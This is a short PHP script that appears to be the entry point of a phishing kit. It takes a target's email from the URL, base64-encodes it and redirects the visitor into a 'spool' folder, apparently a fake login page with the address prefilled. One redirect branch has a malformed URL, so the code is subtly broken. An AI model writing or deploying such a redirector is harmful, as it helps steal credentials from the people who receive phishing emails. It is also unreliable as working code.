<?php

require "api.php";

session_start();

$lead = $_GET['email'];
$id = base64_encode ($lead);

if(empty($_SESSION['email'])) {
    echo "<script>window.location = 'spool/?id=$id';</script>";
    exit();
} else {
    echo "<script>window.location = 'spool/id?=$id';</script>";
    exit();
}
?>